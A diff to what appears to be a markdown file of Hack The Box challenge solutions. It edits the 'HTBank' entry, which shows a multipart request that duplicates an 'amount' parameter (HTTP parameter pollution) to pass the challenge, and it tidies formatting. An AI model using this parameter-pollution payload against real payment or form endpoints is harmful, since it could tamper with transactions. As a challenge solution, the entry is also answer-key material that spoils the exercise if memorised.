@@ -111,9 +111,9 @@ Reminder for encoding :
 - Link: https://app.hackthebox.com/challenges/htbank
 - Hint: HTTP Parameter Pollution.
 - SolutionL:
-- 	In a request just add one more amount parameter with value of 1337.
-		  ```
-		  -----------------------------372602692120017375223068472451
+- 	In a request just add one more amount parameter with the value of 1337.
+```
+			----------------------------372602692120017375223068472451
 			Content-Disposition: form-data; name="account"
 			
 			0x038f3bed54d3d0ed704fff0bede93ae2
@@ -127,7 +127,7 @@ Reminder for encoding :
 			
 			1337
 			-----------------------------372602692120017375223068472451--
-		  ```
+```
   -	after that, the ending of the request will be like this, and in response, you will get "OK".
   -	now refresh the page.
 - Explanation: Watch any parameter pollution video/writeUP.
